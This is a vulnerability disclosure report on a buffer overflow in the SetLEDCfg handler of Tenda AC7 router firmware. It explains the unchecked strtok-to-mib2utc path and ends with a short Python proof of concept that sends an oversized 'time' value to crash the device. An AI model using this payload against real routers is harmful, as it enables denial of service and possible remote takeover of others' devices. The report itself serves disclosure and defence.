# Shenzhen Jixiang Tengda Technology Co., Ltd. AC7 has a Buffer Overflow vulnerability

**Vulnerability URL**: [http://192.168.198.76/goform/SetLEDCfg](http://192.168.198.76/goform/SetLEDCfg)

**Firmware Download Link:** [https://www.tenda.com.cn/material/show/2776](https://www.tenda.com.cn/material/show/2776)

## Vulnerability Analysis
The Tenda AC7_V15.03.06.44 firmware has a buffer overflow vulnerability in the `formsetschedled` function

![Image 1](https://github.com/zezhifu1/cve_report/blob/main/AC7/image/formSetSchedLed1.png)

This function accepts `time` and `time_interval` from wp via a POST request. Then, at lines 36 and 37, it calls the `strtok` function twice to extract parts of `time_interval`. At line 40, it passes the extracted results to the `mib2utc` function without any checks. If the input parameter is too large, it will cause the buffer `ali_val` to overflow, which can lead to denial of service or remote code execution.  
Cross-referenced location: from the `formSetSchedLed` function, routed to `SetLEDCfg`, at line 51.

![Image 3](https://github.com/zezhifu1/cve_report/blob/main/AC7/image/formSetSchedLed2.png)

Further cross-referenced.
![Image 4](https://github.com/zezhifu1/cve_report/blob/main/AC7/image/formSetSchedLed3.png)

It can be determined that the vulnerability occurs at the page path `goform/SetLEDCfg`.

## payload
```python
from pwn import *
import requests
url = "http://192.168.198.76/goform/SetLEDCfg"
payload = 1000 * b"1" + b":30-06:30"
response = requests.post(url, data={"time" : payload})
```

# reproduce
![Image 5](https://github.com/zezhifu1/cve_report/blob/main/AC7/image/formSetSchedLed4.png)
![Image 6](https://github.com/zezhifu1/cve_report/blob/main/AC7/image/formSetSchedLed5.png)
![Image 7](https://github.com/zezhifu1/cve_report/blob/main/AC7/image/formSetSchedLed6.png)
